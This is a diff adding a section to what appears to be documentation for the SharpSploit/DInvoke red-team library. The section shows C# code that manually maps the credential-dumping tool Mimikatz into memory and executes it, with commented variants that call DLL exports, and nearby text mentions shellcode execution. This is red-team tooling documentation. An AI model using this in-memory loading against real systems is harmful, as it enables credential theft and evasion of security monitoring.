@@ -262,6 +262,44 @@ Let's walk through the example in sequence:
 
 [4_Resolve.png]
 
+### Example - Calling Exports from Memory
+
+```csharp
+
+namespace MapTest
+{
+    class Program
+    {
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate int MessageBox(IntPtr hWnd, String text, String caption, int options);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate int TestFunc();
+
+        static void Main(string[] args)
+        {
+
+            // (1) Mimikatz x64
+            SharpSploit.Execution.PE.PE_MANUAL_MAP ManMap = SharpSploit.Execution.DynamicInvoke.Generic.MapModuleToMemory(@"C:\Users\b33f\Tools\Mimikatz\x64\mimikatz.exe");
+            SharpSploit.Execution.DynamicInvoke.Generic.CallMappedPEModule(ManMap.PEINFO, ManMap.ModuleBase);
+
+            // (2) Call test DLL by DLLMain
+            //SharpSploit.Execution.PE.PE_MANUAL_MAP ManMap = SharpSploit.Execution.DynamicInvoke.Generic.MapModuleToMemory(@"C:\Users\b33f\Tools\Dll-Template\Dll-Template\x64\Release\Dll-Template.dll");
+            //SharpSploit.Execution.DynamicInvoke.Generic.CallMappedDLLModule(ManMap.PEINFO, ManMap.ModuleBase);
+
+            // (3) Call test DLL by export (Also calls DllMain as part of init)
+            //SharpSploit.Execution.PE.PE_MANUAL_MAP ManMap = SharpSploit.Execution.DynamicInvoke.Generic.MapModuleToMemory(@"C:\Users\b33f\Tools\Dll-Template\Dll-Template\x64\Release\Dll-Template.dll");
+            //object[] FunctionArgs = { };
+            //SharpSploit.Execution.DynamicInvoke.Generic.CallMappedDLLModuleExport(ManMap.PEINFO, ManMap.ModuleBase, "test", typeof(TestFunc), FunctionArgs);
+        }
+    }
+}
+            
+
+```
+
+*TODO: Add an image and show downloading the DLL from memory over HTTP into a byte array.*
+
 ### Example - Syscall Execution
 
 The following example demonstrates how to use DInvoke to directly execute syscalls. We use `GetSyscallStub` to ~steal~borrow the machine code of syscall wrapper within `ntdll.dll` for `NtOpenProcess`. Then, we execute the resulting machine code using a delegate representing `NtOpenProcess`. Incidentally, because we are using a delegate to execute raw machine code, this also demonstrates how you could execute shellcode in the current process while passing in parameters and getting a return value.
